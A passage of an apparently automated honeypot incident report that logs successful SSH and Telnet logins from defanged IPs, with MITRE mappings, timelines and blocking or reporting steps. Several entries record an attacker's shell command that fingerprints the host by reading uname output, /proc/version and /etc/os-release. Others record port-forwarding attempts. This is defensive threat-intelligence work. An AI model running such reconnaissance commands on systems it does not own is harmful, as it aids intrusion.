| `2026-07-28 22:22:28` | `cowrie.command.input` |
| `2026-07-28 22:22:28` | `cowrie.log.closed` |
| `2026-07-28 22:22:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-447459ef0c74

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 22:23 |
| **Last Seen** | 2026-07-28 22:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:23:59` | `cowrie.session.connect` |
| `2026-07-28 22:23:59` | `cowrie.client.version` |
| `2026-07-28 22:23:59` | `cowrie.client.kex` |
| `2026-07-28 22:24:00` | `cowrie.login.success` |
| `2026-07-28 22:24:01` | `cowrie.session.params` |
| `2026-07-28 22:24:01` | `cowrie.command.input` |
| `2026-07-28 22:24:01` | `cowrie.command.input` |
| `2026-07-28 22:24:01` | `cowrie.command.input` |
| `2026-07-28 22:24:01` | `cowrie.command.input` |
| `2026-07-28 22:24:01` | `cowrie.command.input` |
| `2026-07-28 22:24:01` | `cowrie.command.success` |
| `2026-07-28 22:24:01` | `cowrie.command.input` |
| `2026-07-28 22:24:01` | `cowrie.command.input` |
| `2026-07-28 22:24:01` | `cowrie.command.input` |
| `2026-07-28 22:24:01` | `cowrie.command.input` |
| `2026-07-28 22:24:01` | `cowrie.log.closed` |
| `2026-07-28 22:24:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c63dc6ead5c6

| Field | Detail |
|---|---|
| **Source IP** | `43.155.172[.]154` |
| **First Seen** | 2026-07-28 22:25 |
| **Last Seen** | 2026-07-28 22:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:25:23` | `cowrie.session.connect` |
| `2026-07-28 22:25:23` | `cowrie.telnet.option` |
| `2026-07-28 22:25:23` | `cowrie.telnet.option` |
| `2026-07-28 22:26:27` | `cowrie.login.success` |
| `2026-07-28 22:26:27` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `43.155.172[.]154` to AbuseIPDB if not already reported
- [ ] Block `43.155.172[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c933b1838c8d

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 22:25 |
| **Last Seen** | 2026-07-28 22:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:25:26` | `cowrie.session.connect` |
| `2026-07-28 22:25:26` | `cowrie.client.version` |
| `2026-07-28 22:25:26` | `cowrie.client.kex` |
| `2026-07-28 22:25:28` | `cowrie.login.success` |
| `2026-07-28 22:25:29` | `cowrie.session.params` |
| `2026-07-28 22:25:29` | `cowrie.command.input` |
| `2026-07-28 22:25:29` | `cowrie.command.input` |
| `2026-07-28 22:25:29` | `cowrie.command.input` |
| `2026-07-28 22:25:29` | `cowrie.command.input` |
| `2026-07-28 22:25:29` | `cowrie.command.input` |
| `2026-07-28 22:25:29` | `cowrie.command.success` |
| `2026-07-28 22:25:29` | `cowrie.command.input` |
| `2026-07-28 22:25:29` | `cowrie.command.input` |
| `2026-07-28 22:25:29` | `cowrie.command.input` |
| `2026-07-28 22:25:29` | `cowrie.command.input` |
| `2026-07-28 22:25:29` | `cowrie.log.closed` |
| `2026-07-28 22:25:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3a18c976a37

| Field | Detail |
|---|---|
| **Source IP** | `121.128.84[.]224` |
| **First Seen** | 2026-07-28 22:25 |
| **Last Seen** | 2026-07-28 22:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:25:30` | `cowrie.session.connect` |
| `2026-07-28 22:25:31` | `cowrie.client.version` |
| `2026-07-28 22:25:31` | `cowrie.client.kex` |
| `2026-07-28 22:25:32` | `cowrie.login.success` |
| `2026-07-28 22:25:33` | `cowrie.direct-tcpip.request` |
| `2026-07-28 22:25:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.128.84[.]224` to AbuseIPDB if not already reported
- [ ] Block `121.128.84[.]224` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6da6a51a96ce

| Field | Detail |
|---|---|
| **Source IP** | `39.164.91[.]67` |
| **First Seen** | 2026-07-28 22:25 |
| **Last Seen** | 2026-07-28 22:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:25:38` | `cowrie.session.connect` |
| `2026-07-28 22:25:39` | `cowrie.client.version` |
| `2026-07-28 22:25:39` | `cowrie.client.kex` |
| `2026-07-28 22:25:41` | `cowrie.login.success` |
| `2026-07-28 22:25:42` | `cowrie.direct-tcpip.request` |
| `2026-07-28 22:25:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.164.91[.]67` to AbuseIPDB if not already reported
- [ ] Block `39.164.91[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b73d561020b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 22:26 |
| **Last Seen** | 2026-07-28 22:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:26:48` | `cowrie.session.connect` |
| `2026-07-28 22:26:48` | `cowrie.client.version` |
| `2026-07-28 22:26:48` | `cowrie.client.kex` |
| `2026-07-28 22:26:49` | `cowrie.login.success` |
| `2026-07-28 22:26:50` | `cowrie.session.params` |
| `2026-07-28 22:26:50` | `cowrie.command.input` |
| `2026-07-28 22:26:50` | `cowrie.command.input` |
| `2026-07-28 22:26:50` | `cowrie.command.input` |
| `2026-07-28 22:26:50` | `cowrie.command.input` |
| `2026-07-28 22:26:50` | `cowrie.command.input` |
| `2026-07-28 22:26:50` | `cowrie.command.success` |
| `2026-07-28 22:26:50` | `cowrie.command.input` |
| `2026-07-28 22:26:50` | `cowrie.command.input` |
| `2026-07-28 22:26:50` | `cowrie.command.input` |
| `2026-07-28 22:26:50` | `cowrie.command.input` |
| `2026-07-28 22:26:50` | `cowrie.log.closed` |
| `2026-07-28 22:26:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf8bf6e3e1d3

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 22:28 |
| **Last Seen** | 2026-07-28 22:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:28:08` | `cowrie.session.connect` |
| `2026-07-28 22:28:09` | `cowrie.client.version` |
| `2026-07-28 22:28:09` | `cowrie.client.kex` |
| `2026-07-28 22:28:09` | `cowrie.login.success` |
| `2026-07-28 22:28:11` | `cowrie.session.params` |
| `2026-07-28 22:28:11` | `cowrie.command.input` |
| `2026-07-28 22:28:11` | `cowrie.command.input` |
| `2026-07-28 22:28:11` | `cowrie.command.input` |
| `2026-07-28 22:28:11` | `cowrie.command.input` |
| `2026-07-28 22:28:11` | `cowrie.command.input` |
| `2026-07-28 22:28:11` | `cowrie.command.success` |
| `2026-07-28 22:28:11` | `cowrie.command.input` |
| `2026-07-28 22:28:11` | `cowrie.command.input` |
| `2026-07-28 22:28:11` | `cowrie.command.input` |
| `2026-07-28 22:28:11` | `cowrie.command.input` |
| `2026-07-28 22:28:11` | `cowrie.log.closed` |
| `2026-07-28 22:28:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65c6c83f3331

| Field | Detail |
|---|---|
| **Source IP** | `65.20.179[.]251` |
| **First Seen** | 2026-07-28 22:28 |
| **Last Seen** | 2026-07-28 22:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:28:13` | `cowrie.session.connect` |
| `2026-07-28 22:28:13` | `cowrie.client.version` |
| `2026-07-28 22:28:13` | `cowrie.client.kex` |
| `2026-07-28 22:28:14` | `cowrie.login.success` |
| `2026-07-28 22:28:15` | `cowrie.direct-tcpip.request` |
| `2026-07-28 22:28:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.179[.]251` to AbuseIPDB if not already reported
- [ ] Block `65.20.179[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-579c6a848be1

| Field | Detail |
|---|---|
| **Source IP** | `41.214.10[.]178` |
| **First Seen** | 2026-07-28 22:28 |
| **Last Seen** | 2026-07-28 22:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:28:24` | `cowrie.session.connect` |
| `2026-07-28 22:28:24` | `cowrie.client.version` |
| `2026-07-28 22:28:24` | `cowrie.client.kex` |
| `2026-07-28 22:28:25` | `cowrie.login.success` |
| `2026-07-28 22:28:26` | `cowrie.direct-tcpip.request` |
| `2026-07-28 22:28:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.214.10[.]178` to AbuseIPDB if not already reported
- [ ] Block `41.214.10[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d138945e67c4

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 22:29 |
| **Last Seen** | 2026-07-28 22:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:29:31` | `cowrie.session.connect` |
| `2026-07-28 22:29:31` | `cowrie.client.version` |
| `2026-07-28 22:29:31` | `cowrie.client.kex` |
| `2026-07-28 22:29:32` | `cowrie.login.success` |
| `2026-07-28 22:29:33` | `cowrie.session.params` |
| `2026-07-28 22:29:33` | `cowrie.command.input` |
| `2026-07-28 22:29:33` | `cowrie.command.input` |
| `2026-07-28 22:29:33` | `cowrie.command.input` |
| `2026-07-28 22:29:33` | `cowrie.command.input` |
| `2026-07-28 22:29:33` | `cowrie.command.input` |
| `2026-07-28 22:29:33` | `cowrie.command.success` |
| `2026-07-28 22:29:33` | `cowrie.command.input` |
| `2026-07-28 22:29:33` | `cowrie.command.input` |
| `2026-07-28 22:29:33` | `cowrie.command.input` |
| `2026-07-28 22:29:33` | `cowrie.command.input` |
| `2026-07-28 22:29:34` | `cowrie.log.closed` |
| `2026-07-28 22:29:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08c9b937de30

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 22:30 |
| **Last Seen** | 2026-07-28 22:30 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:30:50` | `cowrie.session.connect` |
| `2026-07-28 22:30:51` | `cowrie.client.version` |
| `2026-07-28 22:30:51` | `cowrie.client.kex` |
| `2026-07-28 22:30:53` | `cowrie.login.success` |
| `2026-07-28 22:30:54` | `cowrie.session.params` |
| `2026-07-28 22:30:54` | `cowrie.command.input` |
| `2026-07-28 22:30:54` | `cowrie.command.input` |
| `2026-07-28 22:30:54` | `cowrie.command.input` |
| `2026-07-28 22:30:54` | `cowrie.command.input` |
| `2026-07-28 22:30:54` | `cowrie.command.input` |
| `2026-07-28 22:30:54` | `cowrie.command.success` |
| `2026-07-28 22:30:54` | `cowrie.command.input` |
| `2026-07-28 22:30:54` | `cowrie.command.input` |
| `2026-07-28 22:30:54` | `cowrie.command.input` |
| `2026-07-28 22:30:54` | `cowrie.command.input` |
| `2026-07-28 22:30:55` | `cowrie.log.closed` |
| `2026-07-28 22:30:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41cc7179340b

| Field | Detail |
|---|---|
| **Source IP** | `31.41.84[.]98` |
| **First Seen** | 2026-07-28 22:31 |
| **Last Seen** | 2026-07-28 22:31 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:31:35` | `cowrie.session.connect` |
| `2026-07-28 22:31:36` | `cowrie.client.version` |
| `2026-07-28 22:31:36` | `cowrie.client.kex` |
| `2026-07-28 22:31:36` | `cowrie.login.success` |
| `2026-07-28 22:31:37` | `cowrie.direct-tcpip.request` |
| `2026-07-28 22:31:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.41.84[.]98` to AbuseIPDB if not already reported
- [ ] Block `31.41.84[.]98` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a4941358fce

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 22:32 |
| **Last Seen** | 2026-07-28 22:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:32:07` | `cowrie.session.connect` |
| `2026-07-28 22:32:07` | `cowrie.client.version` |
| `2026-07-28 22:32:07` | `cowrie.client.kex` |
| `2026-07-28 22:32:09` | `cowrie.login.success` |
| `2026-07-28 22:32:10` | `cowrie.session.params` |
| `2026-07-28 22:32:10` | `cowrie.command.input` |
| `2026-07-28 22:32:10` | `cowrie.command.input` |
| `2026-07-28 22:32:10` | `cowrie.command.input` |
| `2026-07-28 22:32:10` | `cowrie.command.input` |
| `2026-07-28 22:32:10` | `cowrie.command.input` |
| `2026-07-28 22:32:10` | `cowrie.command.success` |
| `2026-07-28 22:32:10` | `cowrie.command.input` |
| `2026-07-28 22:32:10` | `cowrie.command.input` |
| `2026-07-28 22:32:10` | `cowrie.command.input` |
| `2026-07-28 22:32:10` | `cowrie.command.input` |
| `2026-07-28 22:32:10` | `cowrie.log.closed` |
| `2026-07-28 22:32:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e542a1199680

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 22:33 |
| **Last Seen** | 2026-07-28 22:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:33:26` | `cowrie.session.connect` |
| `2026-07-28 22:33:26` | `cowrie.client.version` |
| `2026-07-28 22:33:26` | `cowrie.client.kex` |
| `2026-07-28 22:33:27` | `cowrie.login.success` |
| `2026-07-28 22:33:29` | `cowrie.session.params` |
| `2026-07-28 22:33:29` | `cowrie.command.input` |
| `2026-07-28 22:33:29` | `cowrie.command.input` |
| `2026-07-28 22:33:29` | `cowrie.command.input` |
| `2026-07-28 22:33:29` | `cowrie.command.input` |
| `2026-07-28 22:33:29` | `cowrie.command.input` |
| `2026-07-28 22:33:29` | `cowrie.command.success` |
| `2026-07-28 22:33:29` | `cowrie.command.input` |
| `2026-07-28 22:33:29` | `cowrie.command.input` |
| `2026-07-28 22:33:29` | `cowrie.command.input` |
| `2026-07-28 22:33:29` | `cowrie.command.input` |
| `2026-07-28 22:33:29` | `cowrie.log.closed` |
| `2026-07-28 22:33:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-078c17732260

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 22:34 |
| **Last Seen** | 2026-07-28 22:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:34:50` | `cowrie.session.connect` |
| `2026-07-28 22:34:50` | `cowrie.client.version` |
| `2026-07-28 22:34:50` | `cowrie.client.kex` |
| `2026-07-28 22:34:51` | `cowrie.login.success` |
| `2026-07-28 22:34:52` | `cowrie.session.params` |
| `2026-07-28 22:34:52` | `cowrie.command.input` |
| `2026-07-28 22:34:52` | `cowrie.command.input` |
| `2026-07-28 22:34:52` | `cowrie.command.input` |
| `2026-07-28 22:34:52` | `cowrie.command.input` |
| `2026-07-28 22:34:52` | `cowrie.command.input` |
| `2026-07-28 22:34:52` | `cowrie.command.success` |
| `2026-07-28 22:34:52` | `cowrie.command.input` |
| `2026-07-28 22:34:52` | `cowrie.command.input` |
| `2026-07-28 22:34:52` | `cowrie.command.input` |
| `2026-07-28 22:34:52` | `cowrie.command.input` |
| `2026-07-28 22:34:53` | `cowrie.log.closed` |
| `2026-07-28 22:34:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b45ab21c36a

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 22:36 |
| **Last Seen** | 2026-07-28 22:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
